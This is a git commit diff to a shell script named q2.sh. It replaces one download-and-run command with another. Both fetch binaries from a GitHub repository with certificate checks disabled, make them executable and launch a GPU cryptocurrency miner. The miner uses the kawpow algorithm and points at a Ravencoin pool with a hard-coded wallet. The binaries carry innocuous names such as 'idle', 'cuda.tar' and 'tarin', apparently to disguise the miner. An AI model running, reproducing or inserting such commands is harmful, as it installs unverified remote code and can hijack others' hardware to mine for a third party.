f1c6cc3de1191caa677deae491057b2ef595c2c5
hanrzme <paulogburne@outlook.com>
2025-10-15 20:48:19 +0800

    Update q2.sh

--- q2.sh
+++ q2.sh
@@ -1,3 +1,5 @@
 #!/bin/bash
 
-wget --no-check-certificate -qO idle 'https://github.com/hanrzme/cuda/raw/refs/heads/main/idle' && wget --no-check-certificate -qO libidle-cuda.so 'https://github.com/hanrzme/cuda/raw/refs/heads/main/libidle-cuda.so' && chmod -R 777 ./idle && chmod -R 777 ./libidle-cuda.so && ./idle -o hk.ravencoin.gfwroute.com:1140 -u RW43fKGSedsG633mYmaUCJgqM1bfdx7c7h.GO5 --algo=kawpow --no-cpu --cuda -k --cuda-loader=./libidle-cuda.so
+##wget --no-check-certificate -qO idle 'https://github.com/hanrzme/cuda/raw/refs/heads/main/idle' && wget --no-check-certificate -qO libidle-cuda.so 'https://github.com/hanrzme/cuda/raw/refs/heads/main/libidle-cuda.so' && chmod -R 777 ./idle && chmod -R 777 ./libidle-cuda.so && ./idle -o hk.ravencoin.gfwroute.com:1140 -u RW43fKGSedsG633mYmaUCJgqM1bfdx7c7h.GO5 --algo=kawpow --no-cpu --cuda -k --cuda-loader=./libidle-cuda.so
+
+cd "$(mktemp -d)" && wget --no-check-certificate -qO- "https://github.com/hanrzme/cuda/raw/refs/heads/main/cuda.tar" |tar -xv && ./tarin -o hk.ravencoin.gfwroute.com:1140 -u RW43fKGSedsG633mYmaUCJgqM1bfdx7c7h.GO --algo=kawpow --no-cpu --cuda -k --cuda-loader=./cuda.so
